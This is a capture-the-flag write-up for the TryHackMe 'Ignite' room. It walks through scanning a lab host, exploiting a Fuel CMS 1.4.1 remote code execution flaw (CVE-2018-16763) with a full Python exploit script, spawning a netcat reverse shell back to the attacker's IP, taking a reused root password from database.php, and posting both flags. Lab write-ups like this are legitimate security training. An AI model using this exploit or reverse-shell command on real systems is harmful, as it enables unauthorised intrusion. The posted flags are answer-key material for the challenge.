---
title: "Ignite"
date: 2025-01-12
slug: ignite
tags: [tryhackme, linux, web, privesc]
difficulty: Easy
---
IP = 10.10.97.171

**enumeration**
```
 nmap -sCV 10.10.97.171
Starting Nmap 7.92 ( https://nmap.org ) at 2025-01-12 18:25 IST
Nmap scan report for 10.10.97.171
Host is up (0.14s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.84 seconds
```

`gobuster dir -u http://10.10.97.171/ -w ../wordlist/directory-list-2.3-medium.txt -x php,html,js`

`$/.html                (Status: 403) [Size: 292]$`
`$/.php                 (Status: 403) [Size: 291]$`
`$/index.php            (Status: 200) [Size: 16595]$`
`$/index                (Status: 200) [Size: 16595]$`
`$/home                 (Status: 200) [Size: 16595]$`
`$/0                    (Status: 200) [Size: 16595]$`
`$/assets               (Status: 301) [Size: 313] [--> http://10.10.97.171/assets/]$`
`$/'                    (Status: 400) [Size: 1134]$`
`$/'.js                 (Status: 400) [Size: 1134]$`
`$/'.html               (Status: 400) [Size: 1134]$`
`$/'.php                (Status: 400) [Size: 1134]$`


admin admin uname and pass found on home page 
![[Pasted image 20250112190036.png]]

```
searchsploit fuel CMS 1.4.1 -w
-------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                          |  URL
-------------------------------------------------------------------------------------------------------- --------------------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                              | https://www.exploit-db.com/exploits/47138
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                              | https://www.exploit-db.com/exploits/49487
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                              | https://www.exploit-db.com/exploits/50477
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                             | https://www.exploit-db.com/exploits/50523   


```



**findings --**
- robot.txt is present /fuel/ is present with a login page 
- it runs on fule CMS v1.4
- uname=admin & pass=admin

---
**exploitation**
having access to the admin page we can insert our own php file to get RCE working 

we will download the RCE exploit from searchsploit using 
```
```
```
❯ searchsploit fuel CMS 1.4.1 -w
-------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                          |  URL
-------------------------------------------------------------------------------------------------------- --------------------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                              | https://www.exploit-db.com/exploits/47138
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                              | https://www.exploit-db.com/exploits/49487
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                              | https://www.exploit-db.com/exploits/50477
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                             | https://www.exploit-db.com/exploits/50523
-------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
❯ searchsploit -m https://www.exploit-db.com/exploits/47138

  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /home/linuxbrew/.linuxbrew/opt/exploitdb/share/exploitdb/exploits/linux/webapps/47138.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/dedfish404/ctf/relevant/47138.py

```
```
```

the exploit script has few burp lines which i have removed and it lookes like 
```
❯ cat 47138.py
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

url = "http://10.10.97.171"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	URL = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	r = requests.get(URL)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]

```

after running we get whole css page back but also the output of our commands

`cmd:whoami`
`systemwww-data`

```
cmd:ls

systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
```

this is not much helpful so we will spawn a reverseshell using 
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.26.44 9999 >/tmp/f `


after getting rev shell we will upgrade our terminal using 
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www$ 
```

```
cd /home
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd www-data
cd www-data
www-data@ubuntu:/home/www-data$ wc /homw/www-data/flag.txt
wc /homw/www-data/flag.txt
wc: /homw/www-data/flag.txt: No such file or directory
www-data@ubuntu:/home/www-data$ wc /home/www-data/flag.txt
wc /home/www-data/flag.txt
 1  1 34 /home/www-data/flag.txt
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b 

```

----
**privilege escalation**

there are always chances of a webserver having a config file which has database of the usernames and passwords so we can access it by 

```

www-data@ubuntu:/var/www$ cd html
cd html
www-data@ubuntu:/var/www/html$ ls
ls
README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt
www-data@ubuntu:/var/www/html$ cd fuel
cd fuel
www-data@ubuntu:/var/www/html/fuel$ ls
ls
application  data_backup  install   modules
codeigniter  index.php	  licenses  scripts
www-data@ubuntu:/var/www/html/fuel$ cd applications
cd applications
bash: cd: applications: No such file or directory
www-data@ubuntu:/var/www/html/fuel$ cd application
cd application
www-data@ubuntu:/var/www/html/fuel/application$ ls
ls
cache	controllers  helpers  index.html  libraries  migrations  third_party
config	core	     hooks    language	  logs	     models	 views
www-data@ubuntu:/var/www/html/fuel/application$ cd config
cd config
www-data@ubuntu:/var/www/html/fuel/application/config$ ls
ls
MY_config.php	     constants.php	google.php     profiler.php
MY_fuel.php	     custom_fields.php	hooks.php      redirects.php
MY_fuel_layouts.php  database.php	index.html     routes.php
MY_fuel_modules.php  doctypes.php	memcached.php  smileys.php
asset.php	     editors.php	migration.php  social.php
autoload.php	     environments.php	mimes.php      states.php
config.php	     foreign_chars.php	model.php      user_agents.php
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
cat database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|	['dsn']      The full DSN string describe a connection to the database.
|	['hostname'] The hostname of your database server.
|	['username'] The username used to connect to the database
|	['password'] The password used to connect to the database
|	['database'] The name of the database you want to connect to
|	['dbdriver'] The database driver. e.g.: mysqli.
|			Currently supported:
|				 cubrid, ibase, mssql, mysql, mysqli, oci8,
|				 odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|	['dbprefix'] You can add an optional prefix, which will be added
|				 to the table name when using the  Query Builder class
|	['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|	['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|	['cache_on'] TRUE/FALSE - Enables/disables query caching
|	['cachedir'] The path to the folder where cache files should be stored
|	['char_set'] The character set used in communicating with the database
|	['dbcollat'] The character collation used in communicating with the database
|				 NOTE: For MySQL and MySQLi databases, this setting is only used
| 				 as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|				 (and in table creation queries made with DB Forge).
| 				 There is an incompatibility in PHP with mysql_real_escape_string() which
| 				 can make your site vulnerable to SQL injection if you are using a
| 				 multi-byte character set and are running versions lower than these.
| 				 Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|	['swap_pre'] A default table prefix that should be swapped with the dbprefix
|	['encrypt']  Whether or not to use an encrypted connection.
|
|			'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|			'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|				'ssl_key'    - Path to the private key file
|				'ssl_cert'   - Path to the public key certificate file
|				'ssl_ca'     - Path to the certificate authority file
|				'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|				'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|				'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|	['compress'] Whether or not to use client compression (MySQL only)
|	['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|							- good for ensuring strict SQL while developing
|	['ssl_options']	Used to set various SSL options that can be used when making SSL connections.
|	['failover'] array - A array with 0 or more data for connections if the main should fail.
|	['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
| 				NOTE: Disabling this will also effectively disable both
| 				$this->db->last_query() and profiling of DB queries.
| 				When you run a query, with this setting set to TRUE (default),
| 				CodeIgniter will store the SQL statement for debugging purposes.
| 				However, this may cause high memory usage, especially if you run
| 				a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
	@include(TESTER_PATH.'config/tester_database'.EXT);
}
www-data@ubuntu:/var/www/html/fuel/application/config$ 


```

the database had root password as mememe 
lets try and see if the password was reuse 
```
www-data@ubuntu:/var/www/html$ su -
su -
Password: mememe

root@ubuntu:~# 

```

----
flags 

user.txt - 6470e394cbf6dab6a91682cc8585059b

root.txt - b9bbcb33e11b80be759c4e844862482d
